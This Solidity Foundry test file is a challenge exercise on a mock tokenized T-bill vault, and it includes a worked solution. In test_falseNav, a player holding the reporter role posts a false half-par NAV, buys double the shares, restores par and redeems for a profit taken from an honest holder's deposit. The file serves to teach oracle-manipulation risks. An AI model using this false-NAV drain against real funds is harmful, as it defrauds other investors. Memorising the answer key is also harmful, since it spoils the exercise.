// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {MockUSDC} from "../../src/MockUSDC.sol";
import {ComplianceRegistry} from "../../src/ComplianceRegistry.sol";
import {TBillToken} from "../../src/TBillToken.sol";
import {TBillVault} from "../../src/TBillVault.sol";
import {MockPriceFeed} from "../../src/exercises/MockPriceFeed.sol";
import {MockTBillCustodian} from "../../src/exercises/MockTBillCustodian.sol";
import {RedemptionQueue} from "../../src/exercises/RedemptionQueue.sol";

/// @title Ex7: profit from a false NAV report
/// @notice The player has reporter and settler roles; Alice is an honest holder.
contract FalseNavChallenge is Test {
    MockUSDC internal usdc;
    ComplianceRegistry internal compliance;
    MockPriceFeed internal feed;
    TBillToken internal tBill;
    MockTBillCustodian internal custodian;
    TBillVault internal vault;
    RedemptionQueue internal queue;

    address internal admin = address(this);
    address internal alice = makeAddr("alice");
    address internal player = makeAddr("player");

    uint256 internal constant PAR = 1e8;
    uint256 internal constant INITIAL_PLAYER_BALANCE = 1_000e6;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        usdc = new MockUSDC();
        compliance = new ComplianceRegistry(admin);
        feed = new MockPriceFeed(int256(PAR));
        tBill = new TBillToken(admin, compliance);
        custodian = new MockTBillCustodian(admin);
        vault = new TBillVault(usdc, tBill, feed, custodian, admin);
        queue = new RedemptionQueue(vault, tBill, usdc, admin);

        tBill.grantRole(tBill.MINTER_ROLE(), address(vault));
        tBill.grantRole(tBill.MINTER_ROLE(), address(queue));
        custodian.grantRole(custodian.CUSTODIAN_ROLE(), address(vault));
        vault.setQueue(address(queue));

        // The player and queue need admission before shares can move.
        compliance.setWhitelisted(address(queue), true);
        compliance.setWhitelisted(alice, true);
        compliance.setWhitelisted(player, true);

        // These roles allow the player to price and settle their own redemption.
        vault.grantRole(vault.REPORTER_ROLE(), player);
        queue.grantRole(queue.SETTLER_ROLE(), player);

        // Alice supplies the cash lost to the false NAV payout.
        usdc.faucet(alice, 1_000e6);
        vm.startPrank(alice);
        usdc.approve(address(vault), 1_000e6);
        vault.subscribe(1_000e6);
        vm.stopPrank();

        usdc.faucet(player, INITIAL_PLAYER_BALANCE);
    }

    function test_assertInitialState() public {
        assertEq(vault.navPerShare(), PAR, "the NAV starts at par");
        assertEq(tBill.balanceOf(alice), 1_000e18, "alice holds 1000 shares");
        assertEq(usdc.balanceOf(player), INITIAL_PLAYER_BALANCE);
        assertEq(vault.reserveBalance(), 1_000e6, "the vault holds alice's cash");

        // Alice has no reporter role.
        vm.prank(alice);
        vm.expectRevert();
        vault.attest(int256(2e8));
    }

    function test_falseNav() public checkSolvedByPlayer {
        vault.attest(int256(0.5e8));
        usdc.approve(address(vault), INITIAL_PLAYER_BALANCE);
        vault.subscribe(INITIAL_PLAYER_BALANCE);
        assertEq(tBill.balanceOf(player), 2_000e18);

        vault.attest(int256(PAR));
        tBill.approve(address(queue), 2_000e18);
        queue.enqueue(2_000e18);
        assertEq(queue.settle(2_000e6), 2_000e6);
        assertEq(queue.claim(), 2_000e6);
    }

    function _isSolved() private {
        // Profit must come at the expense of the remaining fund.
        assertGt(usdc.balanceOf(player), INITIAL_PLAYER_BALANCE, "the player did not profit");
        assertLt(
            vault.reserveBalance() + usdc.balanceOf(address(queue)),
            vault.totalClaimValue(),
            "the fund is not underwater, so nobody was actually robbed"
        );
    }
}
